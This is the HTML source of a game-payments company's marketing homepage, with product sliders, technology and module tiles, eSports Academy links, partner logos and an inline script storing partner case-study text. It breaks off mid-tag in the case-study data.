                            <h1 class="slider-header" data-scroll-reveal="enter top and move 40px over 1s">
                                Mobile PayStation                            </h1>
                            <h5 class="slider-text" data-scroll-reveal="enter left and move 40px over 1s">
                                Complete mobile interface for in-game purchases.                            </h5>
                            <div class="slider-buttons">
                                <a href="https://developers.xsolla.com/" target="_blank" class="btn btn-lg btn-bright narrow white two-across">
                                    Get Started                                </a>
                                <a href="https://livedemo.xsolla.com/mobile" target="_blank" class="btn btn-lg transparent narrow two-across fontawesome fa-play-circle">
                                    Live Demo                                </a>
                            </div>
                        </div>
                        <div class="slider-image" data-scroll-reveal="enter left and move 40px over 1s">
                            <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/home_page_slider_mobile_paystation.png" alt="Xsolla Mobile Paystation"/>
                        </div>
                    </div>

                    <div class="slider-panel">
                        <div class="slider-info">
                            <h1 class="slider-header" data-scroll-reveal="enter top and move 40px over 1s">
                                PayStation                            </h1>
                            <h5 class="slider-text" data-scroll-reveal="enter left and move 40px over 1s">
                                Comprehensive in-game store management system.                            </h5>
                            <div class="slider-buttons">
                                <a href="https://developers.xsolla.com/" target="_blank" class="btn btn-bright btn-lg narrow white two-across">
                                    Get Started                                </a>
                                <a href="https://livedemo.xsolla.com/paystation" target="_blank" class="btn btn-lg transparent narrow two-across fontawesome fa-play-circle">
                                    Live Demo                                </a>
                            </div>
                        </div>
                        <div class="slider-image" data-scroll-reveal="enter left and move 40px over 1s">
                            <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/home_page_slider_paystation30.png"  alt="Xsolla Paystation 3.0"/>
                        </div>
                    </div>

                    <div class="slider-panel">
                        <div class="slider-info">
                            <h1 class="slider-header" data-scroll-reveal="enter top and move 40px over 1s">
                                Publisher Account                            </h1>
                            <h5 class="slider-text" data-scroll-reveal="enter left and move 40px over 1s">
                                Easy backend tool to set up game store, payments, analytics, and more.                            </h5>
                            <div class="slider-buttons">
                                <a href="https://publisher.xsolla.com/signup" target="_blank" class="btn btn-bright btn-lg narrow two-across white">
                                    Get Started                                </a>
                                <a href="https://demo-publisher.xsolla.com/" target="_blank" class="btn btn-lg transparent narrow two-across fontawesome fa-play-circle">
                                    Live Demo                                </a>
                            </div>
                        </div>
                        <div class="slider-image" data-scroll-reveal="enter left and move 40px over 1s">
                            <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/home_page_slider_merchant_account.png" alt="Xsolla Merchant Account"/>
                        </div>
                    </div>

                    <div class="slider-panel">
                        <div class="slider-info">
                            <h1 class="slider-header" data-scroll-reveal="enter top and move 40px over 1s">
                                Slemma                            </h1>
                            <h5 class="slider-text" data-scroll-reveal="enter left and move 40px over 1s">
                                In-depth game and payment analytics with easy-to-read dashboards.                            </h5>
                            <div class="slider-buttons">
                                <a href="http://developers.xsolla.com/data-portal.html" target="_blank" class="btn btn-bright btn-lg narrow white two-across">
                                    Get Started                                </a>
                                <a href="https://slemma.com/demo/xsolla-payments" target="_blank" class="btn btn-lg transparent narrow two-across fontawesome fa-play-circle">
                                    Live Demo                                </a>
                            </div>
                        </div>
                        <div class="slider-image" data-scroll-reveal="enter left and move 40px over 1s">
                            <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/home_page_slider_image_slemma.png" alt="Slemma Cloud Data Analytics Software"/>
                        </div>
                    </div>
                                                        </div>
            </div>
        </div>
    </div>

    <div class="technology-background">
        <section id="technology" class="technology">
            <h2 class="section-header dark">Technology</h2>
            <div class="tabular tabular-two-column technology-table">
                <div class="tabular-row">
                    <div class="tabular-cell">
                        <div class="tabular-cell-image">
                            <a class="item-img paystation-3" href="http://xsolla.com/technology/paystation">
                                <img
                                    src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__paystation.png"  alt="Xsolla Paystation 3.0 Icon">
                            </a>
                        </div>
                        <div class="tabular-cell-content">
                            <a class="item-title" href="http://xsolla.com/technology/paystation">PayStation</a>
                            <div class="item-desc">Comprehensive in-game store management system.</div>
                            <a class="item-link" href="http://xsolla.com/technology/paystation">
                                Learn more                            </a>
                        </div>
                    </div>
                    <div class="tabular-cell">
                        <div class="tabular-cell-image">
                            <a class="item-img mobile-paystation-3" href="http://xsolla.com/technology/mobile-paystation/">
                                <img
                                    src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__mobile-paystation.png" alt="Xsolla Mobile Paystation Icon">
                            </a>
                        </div>
                        <div class="tabular-cell-content">
                            <a class="item-title"
                               href="http://xsolla.com/technology/mobile-paystation/">Mobile PayStation</a>
                            <div
                                class="item-desc">Complete mobile interface for in-game purchases.</div>
                            <a class="item-link" href="http://xsolla.com/technology/mobile-paystation/">
                                Learn more                            </a>
                        </div>
                    </div>
                </div>

                <div class="tabular-row">
                    <div class="tabular-cell">
                                                <div class="tabular-cell-image">
                            <a class="item-img unity-sdk" href="http://xsolla.com/technology/unity-sdk/">
                                <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__unity-sdk.png" alt="Xsolla Unity-SDK Icon">
                            </a>
                        </div>
                        <div class="tabular-cell-content">
                            <a class="item-title"
                               href="http://xsolla.com/technology/unity-sdk/">Unity SDK</a>
                            <div
                                class="item-desc">In-game billing and store management for Unity games.</div>
                            <a class="item-link" href="http://xsolla.com/technology/unity-sdk/">
                                Learn more                            </a>
                        </div>
                    </div>
                    <div class="tabular-cell">
                                                <div class="tabular-cell-image">
                            <a class="item-img pay2play" href="http://xsolla.com/technology/pay2play">
                                <img
                                    src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__pay2play.png" alt="Xsolla Pay2Play Icon">
                            </a>
                        </div>
                        <div class="tabular-cell-content">
                            <a class="item-title"
                               href="http://xsolla.com/technology/pay2play">Pay2Play</a>
                            <div
                                class="item-desc">Plug & play widget that makes selling games easy.</div>
                            <a class="item-link" href="http://xsolla.com/technology/pay2play">
                                Learn more                            </a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bottom-background"></div>
        </section>
    </div>

    <div class="modules-background">
        <section id="modules" class="modules-background-image">
            <h2 class="section-header dark">Modules</h2>
            <div class="items-list__three item-list__centered items-list__background_charcoal">

                <div class="item fix-size" data-scroll-reveal="wait 0.6s, then move 0px over 1s">
                    <div class="tabular-cell-content">
                        <a href="http://xsolla.com/modules/game-store">
                            <img
                                src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__game-store.png" alt="Xsolla Game Store Icon">
                        </a>
                    </div>
                    <a class="item-title"
                       href="http://xsolla.com/modules/game-store">Game Store</a>
                    <a class="item-link" href="http://xsolla.com/modules/game-store">
                        Learn more                    </a>
                </div>

                <div class="item fix-size" data-scroll-reveal="wait 0.6s, then move 0px over 1s">
                    <div class="tabular-cell-content">
                        <a href="http://xsolla.com/modules/payments">
                            <img
                                src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__payments.png" alt="Xsolla Payments Icon">
                        </a>
                    </div>
                    <a class="item-title"
                       href="http://xsolla.com/modules/payments">Payments</a>
                    <a class="item-link" href="http://xsolla.com/modules/payments">
                        Learn more                    </a>
                </div>

                <div class="item fix-size" data-scroll-reveal="wait 0.6s, then move 0px over 1s">
                    <div class="tabular-cell-content">
                        <a href="http://xsolla.com/modules/analytics">
                            <img
                                src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__analytics.png" alt="Xsolla Analytics Icon">
                        </a>
                    </div>
                    <a class="item-title"
                       href="http://xsolla.com/modules/analytics">Analytics</a>
                    <a class="item-link" href="http://xsolla.com/modules/analytics">
                        Learn more                    </a>
                </div>

                <div class="item fix-size" data-scroll-reveal="wait 0.6s, then move 0px over 1s">
                    <div class="tabular-cell-content">
                        <a href="http://xsolla.com/modules/support">
                            <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__support.png" alt="Xsolla Support Icon">
                        </a>
                    </div>
                    <a class="item-title"
                       href="http://xsolla.com/modules/support">Support</a>
                    <a class="item-link" href="http://xsolla.com/modules/support">
                        Learn more                    </a>
                </div>

                <div class="item fix-size" data-scroll-reveal="wait 0.6s, then move 0px over 1s">
                    <div class="tabular-cell-content">
                        <a href="http://xsolla.com/modules/xsolla-network">
                            <img src="//cdn.xsolla.net/xsolla-live/img/pages/home/icon__xsolla-network.png" alt="Xsolla Network Icon">
                        </a>
                    </div>
                    <a class="item-title"
                       href="http://xsolla.com/modules/xsolla-network">Xsolla Network</a>
                    <a class="item-link" href="http://xsolla.com/modules/xsolla-network">
                        Learn more                    </a>
                </div>
            </div>
            <div class="bottom-background"></div>
        </section>
    </div>

    <section id="xsolla-esports-academy" class="xsolla-esports-academy">
        <h2 class="section-header dark">Xsolla eSports Academy</h2>
        <div class="items-list__three items-list__padded item-list__centered items-list__background_solid-black">
            <div class="item">
                <div class="tabular-cell-content">
                    <a href="https://coach.xsolla.academy/">
                        <img
                            src="//cdn.xsolla.net/xsolla-live/img/pages/home/academy_logotype_1.png" alt="Xsolla eSports Academy Coach">
                    </a>
                </div>
                <a class="item-title"
                   href="https://coach.xsolla.academy/">Coach</a>
                <div
                    class="item-desc">Submit your credentials today and start teaching!</div>
                <a class="item-link" href="https://coach.xsolla.academy/">
                    Learn more                </a>
            </div>

            <div class="item">
                <div class="tabular-cell-content">
                    <a href="https://coach.xsolla.academy/">
                        <img
                            src="//cdn.xsolla.net/xsolla-live/img/pages/home/academy_logotype_2.png" alt="Xsolla eSports Academy School">
                    </a>
                </div>
                <a class="item-title"
                   href="https://coach.xsolla.academy/">School</a>
                <div
                    class="item-desc">Create your own team of eSports pros and coach!</div>
                <a class="item-link" href="https://coach.xsolla.academy/">
                    Learn more                </a>
            </div>

            <div class="item">
                <div class="tabular-cell-content">
                    <a href="https://xsolla.academy/index">
                        <img
                            src="//cdn.xsolla.net/xsolla-live/img/pages/home/academy_logotype_3.png" alt="Xsolla eSports Academy Student">
                    </a>
                </div>
                <a class="item-title"
                   href="https://xsolla.academy/index">Student</a>
                <div class="item-desc">Sign up today and get instruction from the best!</div>
                <a class="item-link" href="https://xsolla.academy/index">
                    Learn more                </a>
            </div>
        </div>
    </section>
</div>
    <section class="white">
        <h2 class="section-header">Our Game Partners</h2>
            <div class="items-list__four item-list__partners">
                    <div class="item partner ajax mechwarrior-online" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1420">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/mechwarrior_online.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/mechwarrior_online_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax crytek" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1369">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/crytek.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/crytek_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax miniclip" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1424">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/miniclip.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/miniclip_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax woozworld" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1422">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/wooz_world.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/wooz_world_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax standing-stone-games" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1496">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/turbain_normal.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/turbain_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax nexon" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1346">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/nexon.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/nexon_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax hi-rez-studios" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1298">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/hirez_normal.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/hirez_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax r2games" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1358">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/r2games.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/r2games_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ajax twitch" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1265">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/twitch.png" alt="">
                <img class="hover hidden" src="https://xsolla.com/app/uploads/2016/07/twitch_hover.png" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner snail-games-2" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1301">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/snail_games.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner kongregate" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1289">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/kongregate.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner netdragon" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1575">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/netdragon_normal.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ubisoft" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1292">
                <img class="main_img" src="https://xsolla.com/app/uploads/2017/07/ubisoft_new.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner bigpoint" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1295">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/bigpoint.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner changyou" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1355">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/changyou_normal.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner perfect-world" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1416">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/perfect_world.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner estsoft" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1418">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/estsoft_normal.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner snail-games" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1279">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/gaijin.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner ccp" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1426">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/ccp.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                    <div class="item partner valve" data-hide-border="" data-scroll-reveal="enter top and move 40px over 1s" partner-id="1282">
                <img class="main_img" src="https://xsolla.com/app/uploads/2016/07/steam_normal.png" alt="">
                <img class="hover hidden" src="" alt="">
                <div class="separator"></div>
            </div>
                <div class="button more-button" data-scroll-reveal="wait 0.3s, then enter top and move 40px over 1s">
            <a href="https://publisher.xsolla.com/signup" class="btn btn-purple-medium-for-list"
               target="_blank">Become Our Partner</a>
        </div>
                    <script type="text/javascript">
                if (!window.__partnerHTML)
                    window.__partnerHTML = {};
                (function(partnerHTML) {
                    var tempJSON = {"1420":"<div class=\"partner-wrapper\" id=\"partner-wrap-1420\"><div class=\"main\" style=\"background-color: #7164B2;\" ><h3><span style=\"color: #ffffff;\">MechWarrior Online Case Study<\/span><\/h3>\n<p><span style=\"color: #ffffff;\">Piranha Games saw that they needed to implement an inclusive, reliable solution to accept payments globally for their hit game, MechWarrior Online. Their vast user network demanded immediate attention and, in order to cater to their necessities, Piranha Games decided to move forward with Xsolla\u2019s services which span the entire globe with over 600 payment methods available.<\/span><\/p>\n<p><span style=\"color: #ffffff;\">With prior payment services scheduled to be switched off shortly, Piranha Games acted proactively and found that Xsolla\u2019s solution fit their needs perfectly.<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\"><a class=\"btn transparent\" href=\"\/\/cdn3.xsolla.com\/xsolla-live\/public\/mechwarrior.pdf\" target=\"_blank\">Read case study<\/a><\/span><\/p>\n<p><a href=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/mechwarrior.png\"><img class=\"alignnone wp-image-1440 size-full\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/mechwarrior.png\" alt=\"background\" width=\"832\" height=\"544\" \/><\/a><\/p>\n<\/div><\/div>","1369":"<div class=\"partner-wrapper\" id=\"partner-wrap-1369\"><div class=\"left\" style=\"background-color: #7164B2;\" ><h3><span style=\"color: #ffffff;\">Crytek Case Study<\/span><\/h3>\n<p><span style=\"color: #ffffff;\">Xsolla provided a customized payment interface which is opened in the pop-up window. Our team used Webkit to develop this solution, which united client- based games and web-based payment methods. <\/span><\/p>\n<p><span style=\"color: #ffffff;\">Xsolla greatly increased the number of markets by providing more payment solutions for particular countries and specific regions. This allowed more traffic to be attracted into the game and also helped the conversion.<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\"><a class=\"btn transparent\" href=\"\/\/cdn3.xsolla.com\/xsolla-live\/public\/crytek.pdf\" target=\"_blank\">Read case study<\/a><\/span><\/p>\n<p><img class=\"alignnone size-full wp-image-1431\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/crytek.png\" alt=\"background\" width=\"540\" height=\"544\" \/><\/p>\n<\/div><div class=\"right\">\n<blockquote><p><em><br \/>\nFor gamers who choose to purchase items in-game, the monetization process is a vital part of their overall experience. To make sure that process is as smooth as possible, it&#8217;s essential to partner with a provider that offers multiple payment options, seamless integration, maximum security, and analytical tools that can help us to better understand our players. And that&#8217;s how we see Xsolla \u2013 as the leading payment provider for game-based billing solutions.<\/em><\/p><\/blockquote>\n<p style=\"text-align: right;\"><a href=\"http:\/\/www.crytek.com\/news\/xsolla-and-crytek-join-forces-to-bring-fresh-payment-possibilities-to-warface\" target=\"_blank\">Ilya Mamontov<\/a><\/p>\n<p style=\"text-align: right;\"><a href=\"http:\/\/www.crytek.com\/news\/xsolla-and-crytek-join-forces-to-bring-fresh-payment-possibilities-to-warface\" target=\"_blank\">Crytek&#8217;s Director of Game Operations<\/a><\/p>\n<\/div><\/div>","1424":"<div class=\"partner-wrapper\" id=\"partner-wrap-1424\"><div class=\"main\" style=\"background-color: #7164B2;\" ><p><img class=\"alignnone size-full\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/miniclip.png\" alt=\"background\" width=\"832\" height=\"544\" \/><\/p>\n<h3><span style=\"color: #ffffff;\">Miniclip Case Study<\/span><\/h3>\n<p><span style=\"color: #ffffff;\">Xsolla audited the traffic and reviewed antifraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased 86% compared to 50-55% which was the average. Xsolla significantly customized the games interface. We\u2019ve scaled down the whole payment environment and created a new micro-theme specifically for Miniclip, which proved very effective.<\/span><\/p>\n<\/div><\/div>","1422":"<div class=\"partner-wrapper\" id=\"partner-wrap-1422\"><div class=\"main\" style=\"background-color: #7164B2;\" ><h3><span style=\"color: #ffffff;\">WoozWorld Case Study<\/span><\/h3>\n<p><span style=\"color: #ffffff;\">Instead of having a situation arise where Woozworld players worldwide would have to create a whole new account because of the switch, Xsolla developed a convenient solution which most, if not all Woozens found seamless and unnoticeable. The backend provider of Woozworld was successfully switched to Xsolla\u2019s system and Woozworld maintained stability within their game for Woozens to enjoy.<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\"><a class=\"btn transparent\" href=\"\/\/cdn3.xsolla.com\/xsolla-live\/public\/woozworld.pdf\" target=\"_blank\">Read case study<\/a><\/span><\/p>\n<p><img class=\"alignnone size-full wp-image-1452\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/woozworld.png\" alt=\"background\" width=\"832\" height=\"544\" \/><\/p>\n<\/div><\/div>","1496":"<div class=\"partner-wrapper\" id=\"partner-wrap-1496\"><div class=\"main\" style=\"background-color: #7164B2;\" ><h3><span style=\"color: #ffffff;\">Lord of the Rings Online\u00a0Case Study<\/span><\/h3>\n<blockquote><p><em><span style=\"color: #ffffff;\">Hello from the Standing Stone Games eCommerce team. I\u2019m writing today to tell you about some new and exciting updates coming to the in-game LOTRO Store in the coming weeks! We think the new LOTRO Store will offer a number of great new features, and improve your experience whether you like to browse, purchase items regularly, or just get in and out quickly!<\/span><\/em><\/p><\/blockquote>\n<p style=\"text-align: right;\"><span style=\"color: #ffffff;\">QuartermasterU<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\"><a class=\"btn transparent\" href=\"\/\/cdn3.xsolla.com\/xsolla-live\/public\/lotro.pdf\" target=\"_blank\">Read case study<\/a><\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><br \/>\n<a href=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/turbine-bg-1024x669.png\"><img class=\"alignnone wp-image-1564 size-full\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/turbine-bg-1024x669.png\" alt=\"background\" width=\"1664\" height=\"1088\" \/><\/a><\/p>\n<\/div><\/div>","1346":"<div class=\"partner-wrapper\" id=\"partner-wrap-1346\"><div class=\"main\" style=\"background-color: #7164B2;\" ><h3><span style=\"color: #ffffff;\">Nexon Europe Testimonial<\/span><\/h3>\n<blockquote><p><span style=\"color: #ffffff;\"><em>At Nexon Europe we always strive to provide the widest choice of payment methods for our players which is why we decided to partner with Xsolla. We have a large and diverse player base across many countries and with this addition to our payment portfolio, we are confident that this makes the process even more convenient for our customers.<\/em><\/span><\/p><\/blockquote>\n<p style=\"text-align: right;\"><a href=\"https:\/\/xsolla.com\/blog\/2015\/04\/29\/xsolla-partners-with-nexon-europe\/\" target=\"_blank\"><span style=\"color: #ffffff;\">Adam Ezziane<\/span><\/a><\/p>\n<p style=\"text-align: right;\"><a href=\"https:\/\/xsolla.com\/blog\/2015\/04\/29\/xsolla-partners-with-nexon-europe\/\" target=\"_blank\"><span style=\"color: #ffffff;\">Nexon Europe Business Development Manager<\/span><\/a><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p>&nbsp;<\/p>\n<p><img class=\"alignnone wp-image-1393 size-full\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/casestudy_nexon.png\" alt=\"background\" width=\"832\" height=\"544\" \/><\/p>\n<\/div><\/div>","1298":"<div class=\"partner-wrapper\" id=\"partner-wrap-1298\"><div class=\"main\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Hi-Rez\u00a0Case Study<\/span><\/h3>\n<p><span style=\"color: #ffffff;\">The primary goal for integration between Hi-Rez Studios and Xsolla was to consolidate both virtual currency and virtual items into one simple solution, PayStation 3.0. Hi-Rez was also able to set up virtual currency packages (such as the Get All Gods Bundle) from within PayStation 3.0 with all calculations conveniently being processed from Xsolla\u2019s side.<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<p><span style=\"color: #ffffff;\"><a class=\"btn transparent\" href=\"\/\/cdn3.xsolla.com\/xsolla-live\/public\/hi-rez_studios.pdf\" target=\"_blank\">Read case study<\/a><\/span><\/p>\n<p><span style=\"color: #ffffff;\">\u00a0<\/span><\/p>\n<\/div><\/div>","1358":"<div class=\"partner-wrapper\" id=\"partner-wrap-1358\"><div class=\"main\" style=\"background-color: #7164B2;\" ><p><a href=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/casestudy_r2.png\"><img class=\"alignnone wp-image-1386 size-full\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/casestudy_r2.png\" alt=\"background\" width=\"832\" height=\"544\" \/><\/a><\/p>\n<h3><span style=\"color: #ffffff;\">R2Games Case Study<\/span><\/h3>\n<p><span style=\"color: #ffffff;\">By switching their payment pages to Xsolla&#8217;s PayStation 3.0 solution, R2Games was able to upgrade their in-game payments to a much more convenient and intuitive solution. The user&#8217;s gaming experience was optimized further which results in added transactions, conversions, and satisfaction.<\/span><\/p>\n<p>&nbsp;<\/p>\n<p>&nbsp;<\/p>\n<p><a class=\"btn transparent\" href=\"\/\/cdn3.xsolla.com\/xsolla-live\/public\/r2.pdf\" target=\"_blank\">Read case study<\/a><\/p>\n<\/div><\/div>","1265":"<div class=\"partner-wrapper\" id=\"partner-wrap-1265\"><div class=\"main\" style=\"background-color: #7164B2;\" ><h3><span style=\"color: #ffffff;\">Twitch TV Testimonial<\/span><\/h3>\n<blockquote>\n<p style=\"color: #ffffff;\"><span style=\"color: #ffffff;\"><em>We know you like options, and we want to give you as many as possible. That\u2019s why we\u2019ve partnered with Xsolla to bring you over 600 new ways to pay for your Twitch Turbo subscription (channel subscriptions very soon\u2122)<\/em><\/span><\/p>\n<\/blockquote>\n<p style=\"text-align: right;\"><a style=\"color: #ffffff;\" href=\"http:\/\/blog.twitch.tv\/2014\/08\/new-payment-options\/\" target=\"_blank\">TwitchTV Blog<\/a><\/p>\n<p><img class=\"alignnone size-full wp-image-1446\" src=\"https:\/\/cdn.xsolla.net\/xsolla-live\/media\/twitch.png\" alt=\"background\" width=\"832\" height=\"544\" \/><\/p>\n<\/div><\/div>","1301":"<div class=\"partner-wrapper\" id=\"partner-wrap-1301\"><div class=\"left\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Xsolla Miniclip Integration: 35% Revenue Increase<\/span><\/h3>\n<p style=\"color: #ffffff; padding-right: 10em;\">Xsolla audited the traffic and reviewed anti-fraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased to 86%, compared to 50-55% which was the prior average.<\/p>\n<p><a href=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png\"><img class=\"alignnone wp-image-1273 size-medium\" title=\"background\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png\" alt=\"background\" width=\"300\" height=\"228\" srcset=\"http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png 300w, http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png 500w\" sizes=\"(max-width: 300px) 100vw, 300px\" \/><\/a><a class=\"btn transparent acrobat\" href=\"#\">Case Study<\/a><\/p>\n<\/div><div class=\"right\">\n<h4><strong>35%<\/strong> revenue \u00a0 \u00a0 \u00a0 \u00a0 increase<\/h4>\n<blockquote><p>Xsolla has been a joy. We have had zero to no issues that was not in their control. Also due to the technology and the gateways to payments we saw a dramatic increase in revenue simply by integrating Xsolla. A payment provider alone increased revenues, which for us was brilliant. Account management, tech team and support has never been a problem. Payments have always been on time. No problems there at all<\/p>\n<figure id=\"attachment_1269\" class=\"thumbnail wp-caption alignnone\" style=\"width: 70px\"><img class=\"wp-image-1269 size-full\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-thumbnail.jpg\" alt=\"test-thumbnail\" width=\"60\" height=\"61\" \/><figcaption class=\"caption wp-caption-text\">Saad Choudri Miniclip<\/figcaption><\/figure><\/blockquote>\n<\/div><\/div>","1289":"<div class=\"partner-wrapper\" id=\"partner-wrap-1289\"><div class=\"left\" style=\"background-color: #887ec2;\" ><h3><span style=\"color: #ffffff;\">Xsolla Miniclip Integration: 35% Revenue Increase<\/span><\/h3>\n<p style=\"color: #ffffff; padding-right: 10em;\">Xsolla audited the traffic and reviewed anti-fraud filters. This allowed Miniclip to increase their conversion rate. Many users who were previously banned were finally given the right to pay and because of this, successful conversion rates increased to 86%, compared to 50-55% which was the prior average.<\/p>\n<p><a href=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png\"><img class=\"alignnone wp-image-1273 size-medium\" title=\"background\" src=\"https:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png\" alt=\"background\" width=\"300\" height=\"228\" srcset=\"http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1-300x228.png 300w, http:\/\/xsolla.com\/app\/uploads\/2015\/09\/test-background1.png 500w\" sizes=\"(max-width: 300px) 100vw, 300px\" \/><\/a><a 